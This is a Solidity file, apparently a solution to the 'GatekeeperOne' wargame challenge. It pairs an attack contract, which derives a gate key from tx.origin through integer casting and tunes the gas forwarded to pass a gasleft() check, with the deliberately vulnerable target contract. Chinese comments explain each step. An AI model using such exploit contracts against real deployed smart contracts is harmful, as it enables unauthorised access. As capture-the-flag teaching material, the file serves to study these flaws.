// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    function enter(address _target, uint gas) external {
        GatekeeperOne target = GatekeeperOne(_target);

        // k = uint64(_gateKey);

        // 1）三个条件中先满足最严格的条件：这个数 k16 是 uint16的；
        // uint32(k) == uint16(uint160(tx.origin)),
        uint16 k16 = uint16(uint160(tx.origin));
        // 2）uint16 是 uint16,所以下面这个条件也满足
        // uint32(k) == uint16(k)
        // 3）右边的16位一样，保证左边的16位（32位）不一样就行，比如，k 的最左边多加个 1：将数字 1 左移 63 位；左移操作会将二进制数向左移动指定的位数，并在右侧用0填充。
        // uint32(k) != k
        uint64 k64 = uint64(1 << 63) + uint64(k16);
        // 4) 将满足条件的 k64 转换成 bytes8

        bytes8 key = bytes8(k64);

        require(gas < 8191, "gas >=8191");
        require(target.enter{gas: 8191 * 10 + gas}(key), "failed");
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // 检查当前剩余的Gas 是否可以被8191整除
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        // 将_gateKey转换为64位整数，然后将其转换为32位整数，再将其转换为16位整数。如果这三个转换的结果相等，条件就满足。
        // 当一个64位的整数 _gateKey 被强制转换为32位整数时，只保留低32位的数值。同样地，当 _gateKey 被强制转换为16位整数时，只保留低16位的数值
        // 关键点是 _gateKey 的值必须在16位的范围内，并且在进行强制转换时，保留了相同的数值
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        // 将_gateKey转换为64位整数，然后将其转换为32位整数。如果这两个转换的结果不相等，条件就满足。
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        // 将_gateKey转换为64位整数，然后将其转换为32位整数，再将当前交易的发起者（tx.origin）转换为160位整数。如果这两个转换的结果相等，条件就满足。
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
